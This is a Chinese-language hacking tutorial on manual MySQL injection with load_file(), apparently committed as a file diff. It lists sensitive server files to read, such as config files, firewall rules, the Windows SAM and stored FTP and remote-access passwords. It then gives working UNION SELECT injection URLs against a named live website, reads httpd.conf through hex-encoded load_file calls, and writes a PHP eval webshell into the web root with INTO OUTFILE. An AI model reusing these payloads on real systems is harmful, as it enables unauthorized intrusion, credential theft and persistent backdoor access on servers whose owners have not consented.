@@ -1,0 +1,92 @@
+                      第十九课mysql手工注入之load_file()应用
+
+作者:dark'moon
+
+and (select count(*) from mysql.user)>0/*
+判断权限
+如果结果返回正常,那么就是具有读写权限了.我们就可以用这个函数去读取系统的敏感文件,去寻找配置文件,寻找数据库连接文件,寻找社工文件,寻找WEB物理路径等等.下面,我给大家总结出了敏感文件列表:
+
+找phpinfo()文件
+php_info.php info.php test.php mysql.php phpinfo.php
+
+敏感信息
+MYSQL注入中，load_file()函数在获得webshell以及提权过程中起着十分重要的作用，常被用来读取各种配置文件，
+/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
+/usr/local/apache2/conf/httpd.conf
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/php5/lib/php.ini //PHP相关设置
+/etc/sysconfig/iptables //从中得到防火墙规则策略
+/etc/httpd/conf/httpd.conf // apache配置文件
+/etc/rsyncd.conf //同步程序配置文件
+/etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP.
+/etc/my.cnf //mysql的配置文件
+/etc/redhat-release //系统版本
+/etc/issue
+/etc/issue.net
+
+c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
+c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
+c:\Program Files\Serv-U\ServUDaemon.ini
+c:\windows\my.ini //MYSQL配置文件
+c:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
+
+等等。实际上，load_file()的作用不止于此，它还可以用来读取系统中的二进制文件，
+
+c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
+c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
+c:\Program Files\RhinoSoft.com\ServUDaemon.exe
+C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
+//存储了pcAnywhere的登陆密码
+
+演示站点
+http://www.cqxiaoma.com
+<?php @eval($_POST['pass']);?>
+info outfile
+
+http://www.cqxiaoma.com/pageNews.php?sid=18&nid=37%20order%20by%2011
+http://www.cqxiaoma.com/pageNews.php?sid=18&nid=-37%20union%20select%201,2,user(),4,5,6,7,8,9,10,11
+view-source:http://www.cqxiaoma.com/pageNews.php?sid=20&nid=71%20and%201=2%20union%20select%201,2,load_file(0x2F6574632F68747470642F636F6E662F68747470642E636F6E66),4,5,6,7,8,9,10,11
+
+
+
+
+'
+
+具有写权限 没有过滤单引号 得到网站物理路径
+
+读/etc/httpd/conf/httpd.conf 提交非法字符报错
+
+
+/var/www/html/cqxiaoma/www/new/info.php
+
+/var/www/html/cqxiaoma/www/new/2.jpg
+上传图片
+
+load_file(/var/www/html/cqxiaoma/www/new/2.jpg) into outfile '/var/www/html/cqxiaoma/www/new/info1.php'
+'<?php @eval($_POST['pass']);?>'
+0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E
+
+
+
+http://www.cqxiaoma.com/pageNews.php?sid=20&nid=71%20and%201=2%20union%20select%201,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E,4,5,6,7,8,9,10,11 into outfile '/var/www/html/cqxiaoma/www/new/upload/1.php'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://www.cqxiaoma.com/pageNews.php?sid=20&nid=-53 union select 1,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E,4,5,6,7,8,9,10,11 into outfile '/var/www/html/cqxiaoma/www/new/upload/xt1.php'
